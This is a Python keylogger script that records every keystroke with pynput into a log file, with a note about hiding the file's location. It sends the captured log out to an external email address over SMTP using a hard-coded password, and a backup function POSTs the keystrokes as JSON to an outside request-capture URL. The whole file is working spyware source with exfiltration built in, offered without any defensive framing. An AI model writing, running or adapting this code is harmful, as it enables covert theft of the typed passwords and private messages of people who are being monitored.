
from pynput import keyboard # requires pip3 install 
import json
import requests # requires pip3 install
from email.message import EmailMessage
import smtplib

addr = "fstackcap@zohomail.com"
log_path = 'test_log.txt' # TODO: make it a more hidden location

def email_attachment():
    sender = addr
    recipient = addr
    with open(log_path, 'rb') as f:
        file_data = f.read()
    message = "Message content goes here."        
    email = EmailMessage()
    email["From"] = sender
    email["To"] = recipient
    email["Subject"] = "Windows log sending"
    email.set_content(message)
    email.add_attachment(file_data, maintype='text', subtype='plain', filename='test_log.txt')

    smtp = smtplib.SMTP("smtp.zoho.com", port=587)
    smtp.starttls()
    smtp.login(sender, "N0t@secr3") # TODO: do *not* expose this, load from key file 
    smtp.sendmail(sender, recipient, email.as_string())
    smtp.quit()


def post_json_log():        # Written as a backup method for email
    with open(log_path,'r') as f:
        lines = f.read().splitlines() # remove newlines

    log_dict = {}
    i = 1

    for l in lines:
        log_dict.update({str(i): l})
        i += 1

    log_dump = json.dumps(log_dict)
    r = requests.post('https://ptsv3.com/t/1234/', log_dump) # temporary location

    if str(r) == '<Response [200]>':
        return True
    else:
        return False


def on_press(key):
    try:
        k = key.char + '\n'
    except AttributeError:
        k = str(key)[4:] + '\n' # [4:] to strip off 'Key.'
    # print(k)
    with open(log_path, "a") as f: # https://stackoverflow.com/questions/1466000/
        f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        # will want to add function to send log to somewhere - maybe a POST?
        # post_success = post_json_log() # true or false, can do something w this
        email_attachment()
        exit()

        # TODO: delete log after 


def main():
    # TODO: add timestamp to log file
    
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

main()
